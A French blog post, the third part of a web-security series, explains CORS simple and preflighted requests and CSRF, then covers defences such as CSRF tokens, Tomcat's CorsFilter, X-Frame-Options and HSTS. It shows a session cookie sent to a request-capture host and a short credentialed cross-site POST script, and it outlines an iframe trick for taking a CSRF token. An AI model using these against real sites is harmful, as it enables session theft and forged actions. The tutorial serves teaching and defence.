---
layout: post
title:  "XSS, CORS, CSRF (Partie 3)"
date:   2016-08-20
category: Web Security
---
Les requêtes Cross-Site.
----------

Bienvenue dans ce dernier volet de notre Saga XSS ([partie 1]({{ site.url }}/xss-cors-csrf-partie-1-xss 
), [partie 2]({{ site.url }}/xss-cors-csrf-partie-2-xss-cookies-session)).  
  
Dans notre précédent article nous avions récupéré un cookie de session insuffisamment sécurisé grâce à une vulnérabilité XSS. Vous étiez nombreux dans ma tête à me demander pourquoi ce message d’erreur (ici Chrome mais le fonctionnement est identique sous IE, Firefox) :  

<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/w7iy5sw7?cookie=PHPSESSID_unsecured=jm5mah0a9uuf4g344096nled73. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access.
</pre>
<br />
Alors que nous avions bien réceptionné notre requête sur requestb.in :  

![Cross-Origin simple]({{ site.url }}/public/images/cors-csrf/cors_1.png)  
Et bien nous sommes dans le cas d’une **requête simple Cross-origin** :  
  
> *Le Cross-origin resource sharing (CORS) est un mécanisme qui permet à des ressources restreintes d’une page web d’être requêtées par un autre domaine que celui de la ressource en question*.  

Comme stipulé sur le site de Mozilla :  

*Le standard de partage de ressources d'origines croisées fonctionne grâce à l'ajout d'entêtes HTTP qui permettent aux serveurs de décrire l'ensemble des origines permises. C'est ensuite le navigateur qui lit cette information et en fait l'usage adéquat. Par ailleurs, pour les requêtes HTTP dont les méthodes pourraient avoir des effets secondaires sur les données utilisateur (non idempotentes - en particulier pour les méthodes HTTP autres que GET, ou pour l'utilisation du POST avec certains types MIME), la spécification mandate les navigateurs de "pré-vérifier" la requête en sollicitant le serveur pour connaître les méthodes approuvées. Cette pré-vérification s'effectue avec la méthode HTTP OPTIONS, et ensuite, après "approbation" du serveur, envoie la requête véritable. Les serveurs peuvent aussi notifier les clients des informations pouvant être associées aux requêtes cross-origin (incluant les cookies et les données d'authentification HTTP).*  

Dans notre exemple de requête simple cross-origin, le domaine de la ressource ayant initié la requête (**http://localhost:80**) étant différent du domaine requêté (**http://requestb.in:80**), notre navigateur détecte une requête **CORS** (l’origine est représentée par **protocole://domaine:port**). Pour connaitre le comportement à adopter, le navigateur attend dans la réponse un header **Access-Control-Allow-Origin** qui nous informe sur l’autorisation d’accès ou non à la ressource. Le comportement par défaut en l’absence d’un tel header est de considérer l’opération comme **DONE** (xhr.readyState == 4) mais de retourner un statut **UNSENT/OPENED** (xhr.status == 0). Nous ne pourrons donc pas accéder au contenu de notre réponse.  
  
Cependant nous remarquons que sans filtre explicite coté serveur et en déléguant la sécurité au navigateur (absence par défaut du header Access-Control-Allow-Origin), la requête a été correctement traitée coté serveur. Ceci ne sera pas le cas avec les requêtes pré-vérifiées.  
  
**Requête simple** :  

Une requête cross-site simple est une requête qui:  

 - Utilise les méthodes HTTP GET, HEAD ou POST. Si POST est utlisé pour envoyer des données au serveur le Content-Type des données envoyé au serveur est soit application/x-www-form-urlencoded, multipart/form-data, ou text/plain.
 - Ne positionne pas d'entêtes personnalisés avec la requête HTTP Request (comme par exemple X-Modified, etc.).

**Requête pré-vérifiée** :  
  
Une requête est prévérifiée si :  

 - Elle utilise des méthodes autres que GET, HEAD ou POST.  Aussi, si POST est utilisée pour envoyer des requêtes de données avec un Content-Type autre que application/x-www-form-urlencoded, multipart/form-data, ou text/plain, par exemple si la requête POST envoie au serveur un contenu utile XML en utilisant application/xml ou text/xml, alors la requête est pré-vérifiée.
 - Elle positionne des entêtes propres (ex: la requête utilise une entête comme X-PINGOTHER).

Vous trouverez un très bon exemple de requête CORS préflight [ici](https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Requ.C3.AAtes_pr.C3.A9-v.C3.A9rifi.C3.A9es).  
  
Le serveur nous retournera tous les headers nécessaires pour informer le client des autorisations Cross-Origin. Encore une fois inutile de faire du copier/coller, vous trouvez la liste de ces headers response [ici]( https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Les_ent.C3.AAtes_HTTP_de_r.C3.A9ponse). Certains [request headers](https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS#Les_ent.C3.AAtes_HTTP_de_la_requ.C3.AAte) sont automatiquement positionnés par le navigateur. 
  

Vous ne pourrez pas agir sur les request headers CORS, si vous tentez ce genre d’opérations :  

```javascript
xhr.setRequestHeader('Origin','http://requestb.in');
xhr.setRequestHeader('Referer','http://requestb.in/11hlgzo1');
```
Vous aurez un joli message sous Chrome et le navigateur positionnera lui-même ces entêtes (comportement identique sous Firefox et IE, seuls les messages d’erreur diffèrent):
<pre class="alert">
Refused to set unsafe header "Origin"  
Refused to set unsafe header "Referer"  
</pre>  
<br />
La première chose pour un site souhaitant faire du CORS est de bien positionner les origines autorisées avec le header **Access-Control-Allow-Origin**. Ce dernier doit stipuler explicitement les origines autorisées pour bénéficier pleinement de l'utilisation des XHR (rappelons que l'utilisation de ces headers concernent les XmlHttpRequest, une iframe par exemple n'émettra pas de header Origin et sera soumise à la [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Changing_origin)).  

Cependant ```Access-Control-Allow-Origin: *``` : toutes les origines peuvent accéder à la ressource. La restriction concernant l'utilisation du wildcard est que les réponses des requêtes XHR **withCredentials** ne pourront pas être lues pour des raisons de sécurité, **même si le serveur positionne le header ```Access-Control-Allow-Credentials: true```**. Imaginons que toutes les conditions soient remplies; un pirate pourrait coder depuis son site (ou à partir d'une XSS) une succession de requêtes cross-origin incluant les credentials de l’utilisateur et effectuer des actions à son insu (la lecture des réponses withCredentials implique donc une origine explicitement autorisée par le serveur et un Access-Control-Allow-Credentials: true):  

![Schema attaque CORS]({{ site.url }}/public/images/cors-csrf/cors_2.png)  
  
Comme nous l’avons vu, en l’absence de ce header, le navigateur bloquera l’accès à la réponse. Cependant cette **requête simple CORS POST [withCredentials](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials)** sera interprétée sur le serveur si ce dernier ne possède pas de filtre CORS explicite (à partir d'un site malicieux, les requêtes GET, POST générées à partir d'éléments HTML enverront le cookie dans la requête. Sur de l'Ajax il faut rajouter la clause withCredentials = true).  
  
Pour cet exemple, nous avons créé une page **http://localhost/secu/cookie.html**:  

```html
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST', 'http://requestb.in/11hlgzo1');
	xhr.withCredentials = true;
	xhr.send('op=exaction');
</script>
```

Au préalable nous nous sommes connectés sur **requestb.in**. Ce site initialise plusieurs cookies dont le suivant :  

![Cookie requestb.in]({{ site.url }}/public/images/cors-csrf/cors_3.png)  
Nous remarquons un cookie HttpOnly, donc impossible d’y accéder via **document.cookie**. Cependant **withCredentials** inclut automatiquement les cookies dans la requête (*Update 14/05/2017: validé à nouveau sur Chrome v56, cependant le comportement n'est pas reproductible sur ma Kali sur des versions Firefox ESR v45.3 et Chromium v53*).  
  
Vérifions l’éxecution du payload sur request.bin :  

![Résultat request.bin]({{ site.url }}/public/images/cors-csrf/cors_4.png)  
Un petit tour du côté de la console :
<pre class="alert">
XMLHttpRequest cannot load http://requestb.in/11hlgzo1. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://localhost' is therefore not allowed access
</pre>
<br />
Et de la réponse :  
 
```http
HTTP/1.1 200 OK
Date: Sat, 20 Aug 2016 14:41:21 GMT
Content-Type: text/html; charset=utf-8
Sponsored-By: https://www.runscope.com
Set-Cookie: session=eyJyZWNlbnQiOlsiMTFobGd6bzEiLCIxNzRzOGR3MSJdfQ.Cpn9kQ.ouuFFtBlOyU9cX5aymJeDrg57gQ; HttpOnly; Path=/
Via: 1.1 vegur
Server: cloudflare-nginx
CF-RAY: 2d569b0e05cb0914-CDG
Content-Encoding: gzip
Transfer-Encoding: chunked
```  

L’objet de cette attaque est donc de transmettre à un utilisateur authentifié une requête HTTP falsifiée qui pointe sur une action interne au site (www.site-de-confiance.com), afin qu'il l'exécute sans en avoir conscience et en utilisant ses propres droits. Il s’agit d’une attaque **Cross-Site Request Forgery**. Ici nous n’utilisons pas de faille XSS car tout se passe sur le site du pirate.  
  
**Comment éviter ce type d’attaque CSRF?**  

L’application doit positionner dans les formulaires un **jeton aléatoire unique** non prédictible par l’assaillant (nonce). Ainsi lors d’une soumission sur www.site-de-confiance.com, le serveur vérifiera si ce jeton est présent et si il est valide. Demandez également des confirmations sur vos actions critiques (exemple demande de l’ancien mot de passe si ce dernier doit être changé).  
   
Vous trouverez sur [https://github.com/phackt/DemoWebApp](https://github.com/phackt/DemoWebApp) la protection **CSRF** activée par défaut avec **Spring Security**. Je vous recommande de lire la [documentation](http://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html) si vous utilisez ce framework dans votre web app Java.  
  
Voici par exemple ce qui est généré dans un formulaire :  
 
```html
<form id="idFilesUploadForm" action="uploadFile" method="POST" enctype="multipart/form-data">
	...
	<input type="hidden" name="_csrf" value="400a3ca2-4a8e-4c2e-b248-9d60a0e112b5" />
</form>
```

Vous vous demandez peut être si nous pouvons contourner ce token sur un site vulnérable au XSS. Rappelez-vous notre [payload]({{ site.url }}/xss-cors-csrf-partie-2-xss-cookies-session#iframe) dans notre précédent article et le response header **X-Frame-Options**... Si cet header est absent rien ne nous empêche sur le site www.site-de-confiance.com de charger notre page dans une **iframe**, de récupérer le token et de le soumettre pour effectuer une action malveillante.  
  
Il est également important de définir une politique CORS **coté serveur**. Nous pouvons tout simplement renvoyer un code ```403 – Forbidden``` pour les cross-origin en implémentant un **CORS Filter**. A partir de Tomcat 7 vous pouvez utiliser le filtre [CorsFilter](https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CORS_Filter) dans votre chaine de filtres (fichier web.xml) :  
  
```xml
<filter>
	<filter-name>CorsFilter</filter-name>
	<filter-class>org.apache.catalina.filters.CorsFilter</filter-class>
	<init-param>
		<param-name>cors.allowed.origins</param-name>
		<param-value>http://mondomain</param-value>
	</init-param>
</filter>
<filter-mapping>
	<filter-name>CorsFilter</filter-name>
	<url-pattern>/*</url-pattern>
</filter-mapping>
```
	
Vous trouvez le flowchart du filtre [ici](http://tomcat.apache.org/tomcat-8.0-doc/images/cors-flowchart.png).
**Ceci interdit donc en amont l’accès à toute requête cross-origin.**  
  
**Quid des frameworks pour développer des clients riches comme Angular ou React** ?  
Au vu de la multiplicité des requêtes asynchrones, il convient de positionner un token CSRF unique (à éviter en tant que cookie car devra être en httpOnly pour des requêtes xhr), et de rajouter ce token en tant que header (exemple X-XSRF-TOKEN: a0ed8d95-5694-4b77-853c-b04677677722) dans la requête, header qui sera vérifié coté serveur. Cet en-tête non standard permet également le déclenchement d'une requête préliminaire (OPTIONS) pour vérifier si l'origine de la requête est autoriséé.  
<br />
**Conclusion :**  
  
Nous avons vu que les vecteurs d’attaques sont multiples sur les applications Web. Vous devez mettre en place toutes les mesures pour sécuriser les sessions de vos utilisateurs (assainissement des input, response headers de sécurité, sécurisation des cookies, token CSRF, bannissement du CORS côté serveur). Eprouvez votre application avec les outils nécessaires ([Xenotix](https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework)), regardez quels sont les headers envoyés et reçus directement dans votre navigateur ou grâce à un proxy comme [Burp Suite](https://portswigger.net/burp/) ou [Owasp ZAP]( https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project).  
  
Nous verrons dans un prochain article comment utiliser les techniques vu précédemment dans une attaque Man In The Middle. Imaginez qu'un pirate se positionne entre vous et le site web : toutes les protections abordées précédemment seront indispensables pour éviter l'interception en clair de votre trafic et le vol de vos sessions. Pensez à l'injection d'un payload Javascript dans une ressource quelconque non sécurisée qui effectuerait une requête **cross-site withCredentials** sur du **HTTP** (non over SSL - ceci possible si cookie avec le flag **Secure** absent)...  
  
<a name="hsts"></a>C'est à ce niveau que le response header [HSTS](https://https.cio.gov/hsts/) est primordial, car une ressource en cache dans le navigateur ayant le HSTS de positionné indiquera au navigateur que toute requête sur le domaine de cette ressource fera l'objet d'une redirection interne (307 Internal Redirect). Nous aborderons ce cas pratique identifié sur un site pour montrer que la protection HSTS est ici le dernier recours au vol de session lors d'une attaque MITM si le cookie n'est pas sécurisé (flag **Secure**). Ceci nous prouve que chaque protection doit être mise en place pour contrecarrer toutes les combinaisons d'attaques.  
  
A bientôt.
<br />
<br />
Références :  
[https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS](https://developer.mozilla.org/fr/docs/HTTP/Access_control_CORS)  
[https://www.w3.org/TR/cors/](https://www.w3.org/TR/cors/)  
[https://fr.wikipedia.org/wiki/Cross-Site_Request_Forgery](https://fr.wikipedia.org/wiki/Cross-Site_Request_Forgery)  
[https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html](https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html)
